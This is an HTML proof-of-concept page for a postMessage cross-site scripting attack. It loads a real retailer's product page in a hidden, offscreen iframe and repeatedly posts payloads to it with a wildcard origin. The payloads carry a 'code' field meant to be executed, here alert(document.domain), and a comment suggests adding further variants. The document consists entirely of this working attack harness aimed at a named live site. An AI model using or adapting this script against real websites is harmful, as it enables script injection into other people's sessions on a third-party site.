<!doctype html>
<meta charset="utf-8">
<title>postMessage XSS PoC (no popups)</title>

<iframe id="victim" src="https://www.weber.com/US/en/smoquepelletgrill.html"
        style="width:1px;height:1px;border:0;position:fixed;left:-9999px;top:-9999px;"></iframe>

<script>
const FRAME = document.getElementById('victim');
const DURATION_MS = 15000;   // keep hammering for 15s
const INTERVAL_MS = 400;

// common payload shapes (some handlers expect JSON string, others an object)
const payloads = [
  { isTrusted: true, code: "alert('pwned: '+document.domain)" },
  JSON.stringify({ isTrusted: true, code: "alert('pwned JSON: '+document.domain)" })
  // Add variants if the code checks fields like {type:'exec'} etc.
];

function send() {
  const t0 = Date.now();
  const timer = setInterval(() => {
    if (Date.now() - t0 > DURATION_MS) { clearInterval(timer); return; }
    try { for (const p of payloads) FRAME.contentWindow.postMessage(p, "*"); } catch(e){}
  }, INTERVAL_MS);
}

// start after the iframe finishes loading
FRAME.addEventListener('load', send);
</script>
